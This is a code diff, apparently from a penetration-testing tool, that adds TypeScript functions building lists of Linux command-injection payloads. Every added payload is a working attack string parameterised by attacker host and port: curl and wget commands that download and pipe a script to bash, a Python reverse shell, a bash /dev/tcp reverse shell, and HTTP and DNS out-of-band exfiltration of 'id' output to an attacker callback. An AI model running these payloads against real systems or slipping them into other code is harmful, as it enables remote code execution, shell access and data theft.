@@ -355,6 +355,32 @@ export function buildContainerDeliveryChains(lhost: string, lport: string): Inje
   ];
 }
 
+export function buildLinuxDeliveryChains(lhost: string, lport: string, _cbUrl: string): InjectionPayload[] {
+  const cb = `http://${lhost}:${lport}`;
+  return [
+    makePayload("linux_curl_sh","Curl pipe to bash","Linux","HTTP","linux",
+      `curl -sk ${cb}/sh | bash`,["uid="],"Curl-pipe: downloads and executes shell script from attacker HTTP server."),
+    makePayload("linux_wget_sh","Wget pipe to bash","Linux","HTTP","linux",
+      `wget -qO- ${cb}/sh | bash`,["uid="],"Wget-pipe: alternative to curl for hosts without curl."),
+    makePayload("linux_python_reverse","Python reverse shell","Linux","TCP","linux",
+      `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${lhost}',${lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh','-i'])"`,
+      ["$"],"Python3 raw TCP reverse shell."),
+    makePayload("linux_bash_tcp","Bash /dev/tcp reverse shell","Linux","TCP","linux",
+      `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
+      ["$"],"Bash built-in TCP redirection — no external binaries required."),
+  ];
+}
+
+export function buildOobDeliveryChains(lhost: string, lport: string, cbUrl: string): InjectionPayload[] {
+  const cb = cbUrl || `http://${lhost}:${lport}`;
+  return [
+    makePayload("oob_curl_ping","OOB ping via curl","OOB","HTTP","any",
+      `curl -sk "${cb}/oob?d=$(id|base64 -w0)" 2>/dev/null`,["200"],"OOB HTTP exfil: sends id output base64-encoded to attacker callback URL."),
+    makePayload("oob_dns_ping","OOB ping via DNS","OOB","DNS","linux",
+      `dig +short "$(id|base64 -w0|head -c40).${lhost}" 2>/dev/null`,[""],"OOB DNS exfil: encodes command output in DNS label."),
+  ];
+}
+
 export function buildAllDeliveryChains(lhost: string, lport: string, cbUrl: string): InjectionPayload[] {
   return [
     ...buildLinuxDeliveryChains(lhost, lport, cbUrl),
